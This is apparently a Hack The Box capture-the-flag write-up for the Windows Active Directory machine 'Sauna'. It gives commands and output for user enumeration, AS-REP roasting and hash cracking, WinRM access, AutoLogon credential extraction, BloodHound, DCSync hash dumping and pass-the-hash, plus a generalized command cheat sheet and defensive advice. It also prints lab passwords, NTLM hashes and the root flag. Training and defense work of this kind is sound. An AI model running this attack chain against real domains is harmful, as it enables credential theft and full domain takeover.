# HTB - Sauna - 10.129.95.180



### Machine Info

* **Difficulty:** Easy
* **OS:** Windows (Server 2019 Build 17763)
* **IP:** 10.129.95.180
* **Key Skills:** AS-REP Roasting, AutoLogon credential extraction, DCSync attack, Active Directory enumeration

### Overview

Sauna is an easy Active Directory box that teaches fundamental AD attack techniques. The machine runs an Egotistical Bank website that leaks employee names, which we use to build a username list for Kerberos enumeration. We exploit AS-REP Roasting to obtain a crackable hash, gain initial access via WinRM, discover AutoLogon credentials in the registry, and finally perform a DCSync attack to dump domain hashes and gain administrator access. It's a perfect introduction to Active Directory penetration testing.

**Key Concepts:**

* Active Directory enumeration
* Username generation from employee names
* Kerberos AS-REP Roasting (no pre-authentication required)
* Windows AutoLogon credential extraction
* BloodHound analysis
* DCSync attack
* Pass-the-Hash authentication

**Common Ports:**

* **53/TCP** - DNS
* **80/TCP** - HTTP (Microsoft IIS 10.0)
* **88/TCP** - Kerberos
* **389/TCP** - LDAP
* **445/TCP** - SMB
* **5985/TCP** - WinRM (implied)

**Domain Information:**

* Domain: EGOTISTICAL-BANK.LOCAL
* Hostname: SAUNA
* Domain Controller: SAUNA.EGOTISTICAL-BANK.LOCAL

***

### Exploitation Workflow Summary

1. **Initial Enumeration** ├─ Nmap reveals Active Directory services ├─ Identify domain: EGOTISTICAL-BANK.LOCAL ├─ Web enumeration for information disclosure └─ Extract employee names from website
2. **Username Generation** ├─ Create username wordlist from employee names ├─ Apply common naming conventions ├─ Test variations (firstname, lastname, f.lastname, etc.) └─ Build comprehensive user list
3. **Kerberos Enumeration** ├─ Use kerbrute to validate usernames ├─ Discover valid accounts: fsmith, hsmith ├─ Identify AS-REP Roastable accounts └─ Extract TGT hash for offline cracking
4. **Initial Access** ├─ Crack AS-REP hash with hashcat ├─ Obtain credentials: fsmith:Thestrokes23 ├─ Connect via WinRM as fsmith └─ Capture user flag
5. **Privilege Escalation** ├─ Run WinPEAS for enumeration ├─ Discover AutoLogon credentials in registry ├─ Extract svc\_loanmgr credentials ├─ Analyze permissions with BloodHound ├─ Identify DCSync rights ├─ Perform DCSync attack ├─ Dump Administrator hash └─ Pass-the-Hash for full domain access

***

### Initial Enumeration

#### Port Scanning

Let's scan for Active Directory services:

```bash
nmap -Pn -sCV -vvv 10.129.95.180 -oN hacknetTCP
```

**Results:**

```
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP
445/tcp  open  microsoft-ds
464/tcp  open  kpasswd5
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      (LDAPS)
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP
3269/tcp open  ssl/ldap
```

**What we learned:**

* This is a Domain Controller (DNS + Kerberos + LDAP)
* Domain: EGOTISTICAL-BANK.LOCAL
* Hostname: SAUNA
* IIS web server on port 80
* All standard AD services running

**Key indicators of Active Directory:**

* Port 88 (Kerberos) = Authentication service
* Port 389/636 (LDAP/LDAPS) = Directory service
* Port 53 (DNS) = Name resolution
* Port 445 (SMB) = File sharing

***

### SMB Enumeration

#### Anonymous Access Testing

**Test null session:**

```bash
smbclient -N -L //10.129.95.180
```

**Result:**

```
Anonymous login successful
Sharename       Type      Comment
---------       ----      -------
SMB1 disabled -- no workgroup available
```

No shares accessible, but null session works.

**Test with NetExec:**

```bash
nxc smb 10.129.95.180 -u '' -p ''
```

**Output:**

```
[+] EGOTISTICAL-BANK.LOCAL\:
```

Null authentication works, but no useful data accessible.

**Try guest account:**

```bash
nxc smb 10.129.95.180 -u 'guest' -p ''
```

**Result:**

```
[-] EGOTISTICAL-BANK.LOCAL\guest: STATUS_ACCOUNT_DISABLED
```

Guest account is disabled (common in hardened AD environments).

***

### Web Enumeration

#### Discovering Employee Information

**Access the website:**

```
http://10.129.95.180
```

**Website:** Egotistical Bank corporate site

**Navigate to About page:**

```
http://10.129.95.180/about.html
```

**Employee information found:**

```
Fergus Smith - Software Development
Hugo Bear - CEO
Steven Kerb - Junior Developer  
Shaun Coins - Manager
Bowie Taylor - Support
Sophie Driver - Head of IT
```

**Why this matters:** Employee names often follow predictable username patterns in Active Directory. We can generate a wordlist to test against Kerberos.

***

### Username Generation

#### Creating a Comprehensive User List

**Common AD naming conventions:**

* First initial + last name: `fsmith`
* First name + last initial: `ferguss`
* Full first name: `fergus`
* Full last name: `smith`
* First.Last: `fergus.smith`
* Last.First: `smith.fergus`
* First\_Last: `fergus_smith`

**Generated wordlist** (`users.txt`):

```
fsmith
hbear
skerb
scoins
btaylor
sdriver
f.smith
h.bear
s.kerb
s.coins
b.taylor
s.driver
fergus.s
hugo.b
steven.k
shaun.c
bowie.t
sophie.d
ferguss
hugob
stevenk
shaunc
bowiet
sophied
fergus.smith
hugo.bear
steven.kerb
shaun.coins
bowie.taylor
sophie.driver
fergussmith
hugobeat
stevenkerb
shauncoins
bowietaylor
sophiedriver
smith.fergus
bear.hugo
kerb.steven
coins.shaun
taylor.bowie
driver.sophie
FSmith
HBear
SKerb
SCoins
BTaylor
SDriver
Fergus.Smith
Hugo.Bear
Steven.Kerb
Shaun.Coins
Bowie.Taylor
Sophie.Driver
FSMITH
HBEAR
SKERB
SCOINS
BTAYLOR
SDRIVER
fergus
hugo
steven
shaun
bowie
sophie
smith
bear
kerb
coins
taylor
driver
```

***

### Kerberos Enumeration

#### Username Validation with Kerbrute

**What is Kerbrute?** A tool that validates usernames against a domain controller via Kerberos. It's fast and stealthy - uses standard authentication, so less likely to trigger alerts.

**Running Kerbrute:**

```bash
kerbrute userenum --dc 10.129.95.180 -d EGOTISTICAL-BANK.LOCAL users.txt
```

**Results:**

```
[+] VALID USERNAME: administrator@EGOTISTICAL-BANK.LOCAL
[+] VALID USERNAME: hsmith@EGOTISTICAL-BANK.LOCAL
[+] VALID USERNAME: Administrator@EGOTISTICAL-BANK.LOCAL
[+] VALID USERNAME: fsmith@EGOTISTICAL-BANK.LOCAL
[+] VALID USERNAME: Fsmith@EGOTISTICAL-BANK.LOCAL
```

**Valid usernames discovered:**

* `administrator` (default admin account)
* `hsmith` (Hugo Bear → H. Smith)
* `fsmith` (Fergus Smith → F. Smith)

**Note:** Kerberos is case-insensitive, so `fsmith`, `Fsmith`, and `FSMITH` are the same account.

***

### AS-REP Roasting

#### Understanding AS-REP Roasting

**What is AS-REP Roasting?**

When a user account has "Do not require Kerberos preauthentication" enabled, anyone can request a Ticket Granting Ticket (TGT) for that user without knowing their password. The TGT contains encrypted data that can be cracked offline.

**Why it's dangerous:**

* No authentication required to get the hash
* Hash can be cracked offline
* Common misconfiguration in AD environments

#### Exploiting AS-REP Roasting

**Using Impacket's GetNPUsers:**

```bash
impacket-GetNPUsers EGOTISTICAL-BANK.LOCAL/fsmith -dc-ip 10.129.95.180 -no-pass -format hashcat
```

**Parameters explained:**

* `EGOTISTICAL-BANK.LOCAL/fsmith` - Domain/username
* `-dc-ip 10.129.95.180` - Domain controller IP
* `-no-pass` - Don't prompt for password
* `-format hashcat` - Output in hashcat-compatible format

**Success! Hash obtained:**

```
$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:5e59b1b06cb8df728efab82edd1bb27b$a06709e35f3c6468405ed625d967848e11abd92e0d380208de9aa0e1a5262f53bd68e014953058510d36b0602116a43df49a041ddfddcaa493567e12a9508b50f40f74c4f4f3700c27635da8490a1c4f73d7d2151ddbbd1da054b71b5d4c027402e046c61fd04b6eb8b76092335fde354eb29d34c2457d1ccd0d089a4367cd5f3e52adb4be813fdd43b2646e42c4966907fcb01821f985c8103e09b8638410de4b91b1cf457e3d46a8845a293adbdce33805d6f57658262e0f4fccfc63a0297b0a0af829e790fc372428cc4d93b905d79450b4b3b0e5d1c63b175adb78b2dfe0573cb69fdcc46eccb8f966c9930e5a7194cb31411ba20393633725e971326e09
```

#### Cracking the Hash

**Save to file:**

```bash
echo '$krb5asrep$23$fsmith@...' > fsmith.hash
```

**Crack with hashcat:**

```bash
hashcat -m 18200 fsmith.hash /usr/share/wordlists/rockyou.txt
```

**Hash mode 18200:**

* Kerberos 5, etype 23, AS-REP

**Cracked password:**

```
Thestrokes23
```

**Valid credentials obtained:**

```
fsmith:Thestrokes23
```

***

### Initial Access - WinRM

#### Understanding WinRM

**What is WinRM?** Windows Remote Management - Microsoft's implementation of WS-Management protocol for remote management. Port 5985 (HTTP) or 5986 (HTTPS).

**Why we use it:**

* PowerShell remoting
* Clean, interactive shell
* Less suspicious than Meterpreter
* Native Windows service

#### Connecting via Evil-WinRM

**Install Evil-WinRM:**

```bash
sudo gem install evil-winrm
```

**Connect:**

```bash
evil-winrm -i 10.129.95.180 -u fsmith -p 'Thestrokes23'
```

**Success!**

```
*Evil-WinRM* PS C:\Users\fsmith\Documents>
```

#### User Flag

```powershell
type C:\Users\fsmith\Desktop\user.txt
```

***

### Privilege Escalation - AutoLogon Credentials

#### Enumeration with WinPEAS

**Upload WinPEAS:**

```powershell
upload /path/to/winPEASx64.exe
```

**Execute:**

```powershell
.\winPEASx64.exe
```

**Key finding in output:**

```
Looking for AutoLogon credentials
    Some AutoLogon credentials were found
    DefaultDomainName             :  EGOTISTICALBANK
    DefaultUserName               :  EGOTISTICALBANK\svc_loanmanager
    DefaultPassword               :  Moneymakestheworldgoround!
```

**What are AutoLogon credentials?**

Windows can store credentials in the registry to automatically log in a user at boot. These are stored in plaintext in:

```
HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
```

**Credentials found:**

```
svc_loanmanager:Moneymakestheworldgoround!
```

**Note:** The actual username is `svc_loanmgr` (abbreviated version).

***

### BloodHound Analysis

#### Understanding BloodHound

**What is BloodHound?** A tool that maps Active Directory relationships and attack paths using graph theory. It shows:

* Who has admin rights where
* Shortest path to Domain Admin
* Exploitable ACLs and permissions

#### Data Collection

**Upload SharpHound:**

```powershell
upload /path/to/SharpHound.exe
```

**Execute collector:**

```powershell
.\SharpHound.exe -c All
```

**Output:**

```
20260103230742_BloodHound.zip
```

**Download the zip:**

```powershell
download 20260103230742_BloodHound.zip
```

#### Analysis

**Import to BloodHound:**

1. Start neo4j database
2. Launch BloodHound
3. Upload the ZIP file
4. Mark `svc_loanmgr` as owned

**Key finding:**

**svc\_loanmgr has DCSync rights!**

**What this means:** The account can replicate directory changes, which allows dumping all domain password hashes.

***

### DCSync Attack

#### Understanding DCSync

**What is DCSync?**

A technique that abuses the Directory Replication Service (DRS) to request password data from a domain controller. Normally used by DCs to sync, but if a user has replication rights (GetChanges + GetChangesAll), they can do it too.

**Required permissions:**

* DS-Replication-Get-Changes (GetChanges)
* DS-Replication-Get-Changes-All (GetChangesAll)
* DS-Replication-Get-Changes-In-Filtered-Set (optional)

**Why it's powerful:**

* Remotely dumps all password hashes
* No need to access NTDS.dit file
* Uses legitimate DC replication protocol
* Hard to detect without proper monitoring

#### Performing DCSync

**Using Impacket's secretsdump:**

```bash
secretsdump.py 'svc_loanmgr:Moneymakestheworldgoround!@10.129.95.180'
```

**Output:**

```
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets

Administrator:500:aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:4a8899428cad97676ff802229e466e2c:::
EGOTISTICAL-BANK.LOCAL\HSmith:1103:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201db1dd:::
EGOTISTICAL-BANK.LOCAL\FSmith:1105:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201db1dd:::
EGOTISTICAL-BANK.LOCAL\svc_loanmgr:1108:aad3b435b51404eeaad3b435b51404ee:9cb31797c39a9b170b04058ba2bba48c:::
SAUNA$:1000:aad3b435b51404eeaad3b435b51404ee:cb66e7fdf30823ebc955d21e155bb2fe:::

[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:42ee4a7abee32410f470fed37ae9660535ac56eeb73928ec783b015d623fc657
[... additional Kerberos keys ...]
```

**Administrator hash obtained:**

```
823452073d75b9d1cf70ebdf86c7f98e
```

***

### Administrator Access - Pass-the-Hash

#### What is Pass-the-Hash?

**The concept:**

Windows NTLM authentication accepts password hashes directly - you don't need the plaintext password. This allows us to authenticate using just the hash.

**Why it works:**

NTLM hashes are used directly in the authentication challenge-response. The actual password is never transmitted.

#### Authenticating as Administrator

**Using Evil-WinRM with hash:**

```bash
evil-winrm -i 10.129.95.180 -u Administrator -H 823452073d75b9d1cf70ebdf86c7f98e
```

**Parameters:**

* `-i` - Target IP
* `-u` - Username
* `-H` - NTLM hash (instead of password)

**Success!**

```
*Evil-WinRM* PS C:\Users\Administrator\Documents>
```

**We're Domain Admin!**

#### Root Flag

```powershell
type C:\Users\Administrator\Desktop\root.txt
```

**Flag:**

```
a87d4a4176636d5692a1320eb361f3a8
```

***

### Quick Reference

#### Kerbrute Username Enumeration

```bash
# Enumerate valid usernames
kerbrute userenum --dc DC_IP -d DOMAIN users.txt

# Faster enumeration
kerbrute userenum --dc DC_IP -d DOMAIN users.txt -t 100
```

#### AS-REP Roasting

```bash
# Single user
impacket-GetNPUsers DOMAIN/user -dc-ip DC_IP -no-pass

# Multiple users from file
impacket-GetNPUsers DOMAIN/ -usersfile users.txt -dc-ip DC_IP -no-pass

# Output format for hashcat
impacket-GetNPUsers DOMAIN/user -dc-ip DC_IP -no-pass -format hashcat
```

#### Hashcat for Kerberos

```bash
# AS-REP Roasting hashes
hashcat -m 18200 hash.txt wordlist.txt

# Kerberoasting hashes
hashcat -m 13100 hash.txt wordlist.txt

# Show cracked passwords
hashcat -m 18200 hash.txt --show
```

#### WinRM Access

```bash
# With password
evil-winrm -i IP -u user -p 'password'

# With hash
evil-winrm -i IP -u user -H hash

# With SSL
evil-winrm -i IP -u user -p 'password' -S
```

#### BloodHound Data Collection

```powershell
# All collection methods
.\SharpHound.exe -c All

# Specific collections
.\SharpHound.exe -c Session,Trusts,ACL

# With domain specification
.\SharpHound.exe -c All -d DOMAIN.LOCAL
```

#### DCSync Attack

```bash
# Dump all hashes
secretsdump.py 'user:pass@DC_IP'

# Dump specific user
secretsdump.py 'user:pass@DC_IP' -just-dc-user administrator

# Output to file
secretsdump.py 'user:pass@DC_IP' -outputfile hashes
```

#### Pass-the-Hash

```bash
# Evil-WinRM
evil-winrm -i IP -u user -H hash

# Impacket psexec
impacket-psexec -hashes :hash user@IP

# Impacket wmiexec
impacket-wmiexec -hashes :hash user@IP
```

***

### Troubleshooting

#### Kerbrute Not Finding Users

**Problem:** No valid usernames found

**Solution:**

```bash
# Verify DC connectivity
nmap -p 88 DC_IP

# Test with known username
kerbrute userenum --dc DC_IP -d DOMAIN -username administrator

# Check domain name format
# Use: DOMAIN.LOCAL (not just DOMAIN)
```

#### AS-REP Roast Fails

**Problem:** "Kerberos SessionError: KDC\_ERR\_C\_PRINCIPAL\_UNKNOWN"

**Solution:**

```bash
# Verify username exists
kerbrute userenum --dc DC_IP -d DOMAIN -username fsmith

# Check domain format
impacket-GetNPUsers DOMAIN.LOCAL/user (not DOMAIN/user)

# Try different case
impacket-GetNPUsers DOMAIN/FSmith
```

**Problem:** User exists but no hash returned

**Why:** User has pre-authentication enabled (default secure setting)

**Solution:** Try other users or different attack vectors

#### WinRM Connection Fails

**Problem:** "Connection refused" or timeout

**Solution:**

```bash
# Verify WinRM is accessible
nmap -p 5985,5986 IP

# Check user permissions
# User must be in "Remote Management Users" group

# Try with SSL
evil-winrm -i IP -u user -p 'pass' -S -P 5986
```

#### DCSync Access Denied

**Problem:** "ERROR: DCERPC Runtime Error: code: 0x5 - rpc\_s\_access\_denied"

**Solution:**

```bash
# Verify user has replication rights in BloodHound

# Check exact username (case-sensitive for some tools)
secretsdump.py 'svc_loanmgr:pass@IP' (not svc_loanmanager)

# Try different Impacket syntax
secretsdump.py DOMAIN/user:pass@IP
```

#### BloodHound Collection Fails

**Problem:** SharpHound errors or incomplete data

**Solution:**

```powershell
# Run as current user
.\SharpHound.exe -c All

# Specify credentials
.\SharpHound.exe -c All --LdapUsername user --LdapPassword pass

# Use Python version (from Linux)
bloodhound-python -u user -p pass -d DOMAIN.LOCAL -dc DC_IP -c All
```

***

### Key Takeaways

**What we learned:**

1. **Information disclosure** - Employee names on websites can be leveraged to generate valid username lists for AD attacks
2. **AS-REP Roasting** - Accounts without Kerberos pre-authentication enabled can have their TGTs requested and cracked offline
3. **Username enumeration** - Kerbrute allows fast, stealthy validation of usernames against Active Directory
4. **AutoLogon credentials** - Windows can store plaintext credentials in the registry for automatic login - a major security risk
5. **BloodHound analysis** - Visualizing AD relationships reveals hidden attack paths and excessive permissions
6. **DCSync attack** - Users with replication rights can dump all domain password hashes remotely
7. **Pass-the-Hash** - NTLM hashes can be used directly for authentication without cracking the password

**Attack chain summary:** Web enumeration → Username generation → AS-REP Roasting → Hash cracking → WinRM access → AutoLogon creds → BloodHound → DCSync → Pass-the-Hash → Domain Admin

**Defense recommendations:**

* Don't publish employee full names on public websites
* Enable Kerberos pre-authentication for all accounts
* Never use AutoLogon on domain-joined machines
* Regularly audit AD permissions with BloodHound
* Restrict DCSync rights to only DCs (remove from service accounts)
* Monitor for DCSync activity (Event ID 4662)
* Implement credential guard and LSA protection
* Use strong, unique passwords (>15 characters)
* Enable Advanced Audit Policy for replication events
* Implement tiered admin model

***

### Related Topics

* \[\[Active Directory Attacks]]
* \[\[Kerberos Authentication]]
* \[\[AS-REP Roasting]]
* \[\[DCSync Attack]]
* \[\[BloodHound Analysis]]
* \[\[Pass-the-Hash]]
* \[\[WinRM Exploitation]]
